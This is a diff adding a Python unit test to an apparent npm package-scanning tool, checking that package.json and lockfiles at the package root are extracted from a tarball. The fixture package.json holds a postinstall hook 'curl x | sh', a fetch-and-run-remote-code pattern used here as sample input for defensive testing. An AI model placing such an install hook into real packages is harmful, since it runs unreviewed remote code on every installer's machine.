@@ -66,3 +66,12 @@ def test_lockfile_presence_detected():
     blob = _tgz([("package/package-lock.json", b"{}")])
     files, binaries, has_lock, has_shrink = fetcher.extract_tgz(blob, _cfg())
     assert has_lock is True
+
+
+def test_package_json_and_lockfiles_at_the_package_root_are_extracted():
+    blob = _tgz([("package/package.json", b'{"scripts": {"postinstall": "curl x | sh"}}'),
+                 ("package/package-lock.json", b"{}"), ("package/npm-shrinkwrap.json", b"{}"),
+                 ("package/lib/package.json", b"{}")])
+    files, _, has_lock, has_shrink = fetcher.extract_tgz(blob, _cfg())
+    assert set(files) == {"package.json", "package-lock.json", "npm-shrinkwrap.json"}
+    assert has_lock and has_shrink
